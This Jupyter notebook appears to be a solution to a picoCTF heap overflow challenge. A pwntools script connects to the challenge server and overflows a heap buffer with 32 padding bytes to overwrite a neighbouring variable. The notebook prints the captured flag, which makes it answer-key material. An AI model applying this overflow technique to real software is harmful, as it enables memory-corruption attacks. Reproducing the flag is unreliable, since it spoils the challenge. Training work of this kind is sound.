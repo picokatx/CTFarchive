{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Heap State:\n",
      "+-------------+----------------+\n",
      "[*] Address   ->   Heap Data   \n",
      "+-------------+----------------+\n",
      "[*]   0x56ba6e3232b0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico\n",
      "+-------------+----------------+\n",
      "[*]   0x56ba6e3232d0  ->   pico\n",
      "+-------------+----------------+\n",
      "\n",
      "1. Print Heap:\t\t(print the current state of the heap)\n",
      "2. Write to buffer:\t(write to your own personal block of data on the heap)\n",
      "3. Print safe_var:\t(I'll even let you look at my variable on the heap, I'm confident it can't be modified)\n",
      "4. Print Flag:\t\t(Try to print the flag, good luck)\n",
      "5. Exit\n",
      "\n",
      "Enter your choice: \n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'picoCTF{starting_to_get_the_hang_c588b8a1}\\n'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwnlib.tubes.remote import remote\n",
    "r = remote(\"tethys.picoctf.net\", 51710)\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"2\")\n",
    "r.recvuntil(b\"Data for buffer: \")\n",
    "r.sendline(b\"a\"*32+b\"pico\")\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"1\")\n",
    "print(r.recvuntil(b\"Enter your choice: \").decode())\n",
    "r.sendline(b\"4\")\n",
    "r.recvline()\n",
    "r.recvline()\n",
    "r.recvline()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
